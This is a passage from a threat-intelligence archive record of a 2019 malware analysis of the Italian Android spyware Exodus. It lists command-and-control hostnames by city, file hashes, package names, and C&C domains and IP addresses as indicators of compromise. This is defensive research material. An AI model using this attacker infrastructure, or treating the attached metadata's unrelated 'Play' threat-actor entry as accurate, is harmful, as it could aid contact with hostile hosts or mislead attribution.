Bologna\n\nserver1bs.exodus.connexxa[.]it Brescia\n\nserver1cs.exodus.connexxa[.]it Cosenza\n\nserver1ct.exodus.connexxa[.]it Catania\n\nserver1fermo.exodus.connexxa[.]it\n\nserver1fi.exodus.connexxa[.]it Firenze\n\nserver1gioiat.exodus.connexxa[.]it\n\nserver1na.exodus.connexxa[.]it Napoli\n\nserver1rc.exodus.connexxa[.]it Reggio Calabria\n\nserver2ct.exodus.connexxa[.]it Catania\n\nserver2cz.exodus.connexxa[.]it Catanzaro\n\n\n-----\n\n**Server** **City**\n\nserver2fi.exodus.connexxa[.]it Firenze\n\nserver2mi.exodus.connexxa[.]it Milano\n\nserver2rc.exodus.connexxa[.]it Reggio Calabria\n\nserver3bo.exodus.connexxa[.]it Bologna\n\nserver3ct.exodus.connexxa[.]it Catania\n\nserver3.exodus.connexxa[.]it\n\nserver3fi.exodus.connexxa[.]it Firenze\n\nserver4fi.exodus.connexxa[.]it Firenze\n\nserverrt.exodus.connexxa[.]it\n\n### Public Resume Confirms Development of Android Agent\n\nAdditionally, an employee of eSurv quite precisely described their work in developing an \"agent to gather data from Android devices and\n_send it to a C&C server\" as well as researching \"vulnerabilities in mobile devices (mainly Android)\" in a publicly available resume._\nFurther details in it reflect characteristics of Exodus (such as the bypass of power managers we described from Exodus One, and more):\n\n## Indicators of Compromise\n\n**Exodus One**\n\n011b6bcebd543d4eb227e840f04e188fb01f2335b0b81684b60e6b45388d3820\n\n0f5f1409b1ebbee4aa837d20479732e11399d37f05b47b5359dc53a4001314e5\n\n2055584625d24687bd027a63bc0b8faa7d1a854a535de74afba24840a52b1d2f\n\n26fef238028ee4b5b8da631c77bfb44ada3d5db8129c45dea5df6a51c9ea5f55\n\n33a9da16d096426c82f150e39fc4f9172677885cfeaedcff10c86414e88be802\n\n34d000ee1e36efd10eb37e2b79d69249d5a85682a61390a89a1b9391c46bf2ba\n\n4f6146956b50ae3a6e80a1c1f771dba848ba677064eb0e166df5804ac2766898\n5db49122d866967295874ab2c1ce23a7cde50212ff044bbea1da9b49bb9bc149\n\n70e2eea5609c6954c61f2e5e0a3aea832d0643df93d18d7d78b6f9444dcceef0\n\n80810a8ec9624f317f832ac2e212dba033212258285344661e5da11b0d9f0b62\n\n8453ce501fee1ca8a321f16b09969c517f92a24b058ac5b54549eabd58bf1884\n\na37f5d2418c5f2f64d06ba28fe62edee1293a56158ddfa9f04020e316054363f\n\ndb59407f72666526fca23d31e3b4c5df86f25eff178e17221219216c6975c63f\n\ne0acbb0d7e55fb67e550a6bf5cf5c499a9960eaf5f037b785f9004585202593b\n\n**Exodus One Package Names**\n\ncom.phonecarrier.linecheck\n\nrm.rf\n\noperatore.italia\n\nit.offertetelefonicheperte\n\nit servizipremium\n\n\n-----\n\nassistenza.sim\nassistenza.linea.riattiva\nassistenza.linea\nit.promofferte\n\n**Exodus Two**\n\n64c11fdb317d6b7c9930e639f55863df592f23f3c7c861ddd97048891a90c64b\n\na42a05bf9b412cd84ea92b166d790e8e72f1d01764f93b05ace62237fbabe40e\n\n**Exodus Two ELF Utilities**\n\n00c787c0c0bc26caf623e66373a5aaa1b913b9caee1f34580bdfdd21954b7cc4\n\n11499ff2418f4523344de81a447f6786fdba4982057d4114f64db929990b4b59\n\n13ec6cec511297ac3137cf7d6e4a7c4f5dd2b24478a06262a44f13a3d61070b6\n\n3c9f08b3280851f54414dfa5a57f40d3b7be7b73736fa0ba21b078e75ce54d33\n\n3ee3a973c62ba5bd9eab595a7c94b7a26827c5fa5b21964d511ab58903929ec5\n\n47449a612697ad99a6fbd6e02a84e957557371151f2b034a411ebb10496648c8\n\n48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88\n\n824ad333320cbb7873dc49e61c14f749b0e0d88723635524463f2e6f56ea133a\n\nb46f282f9a1bce3798faee3212e28924730a657eb93cda3824c449868b6ee2e7\n\nc228a534535b22a316a97908595a2d793d0fecabadc32846c6d1bfb08ca9a658\n\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n\ne3f65f84dd6c2c3a5a653a3788d78920c0321526062a6b53daaf23fa57778a5f\n\n**Command & Controls**\n\nad1.fbsba[.]com\n\nws.my-local-weather[.]com\n\n54.71.249[.]137\n\n54.69.156[.]31\n\n162.243.172[.]208\n\nattiva.exodus.esurv[.]it\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-03-29 - Exodus- New Android Spyware Made in Italy.pdf"
    ],
    "report_names": [
        "2019-03-29 - Exodus- New Android Spyware Made in Italy.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535879,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653688045,
    "ts_modification_date": 1653688045,
    "files": {
        "pdf": "https://archive.orkl.eu/9beb83d67042b5c3e3271bcf95076df368aff5a3.pdf",
        "text": "https://archive.orkl.eu/9beb83d67042b5c3e3271bcf95076df368aff5a3.txt",
        "img": "https://archive.orkl.eu/9beb83d67042b5c3e3271bcf95076df368aff5a3.jpg"
    }
}